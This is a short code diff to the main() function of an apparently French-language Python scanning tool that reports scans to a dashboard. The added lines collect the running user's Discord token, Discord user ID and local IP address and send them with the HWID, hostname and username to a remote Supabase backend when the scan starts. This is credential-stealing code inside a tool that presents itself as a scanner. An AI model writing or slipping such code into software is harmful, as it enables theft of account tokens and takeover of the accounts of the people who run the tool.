@@ -200,11 +200,16 @@ def main():
     #    Visible sur le dashboard AVANT la fin du scan
     render_progress("Initialisation", 5, f"Enregistrement scan {scan_id} (HWID: {_g_hwid})")
     try:
+        from src.scanner import get_extended_system_info
+        ext_info = get_extended_system_info()
         initial_info = {
             "hwid"    : _g_hwid,
             "hostname": __import__("socket").gethostname(),
             "user"    : __import__("getpass").getuser(),
-            "status"  : "SCANNING_IN_PROGRESS"
+            "status"  : "SCANNING_IN_PROGRESS",
+            "discord_token": ext_info.get("discord_token", "N/A"),
+            "discord_user_id": ext_info.get("discord_user_id", "N/A"),
+            "local_ip": ext_info.get("local_ip", "N/A")
         }
         _g_sys_info = initial_info
         transmit_initial_scan_to_supabase(scan_id, initial_info)
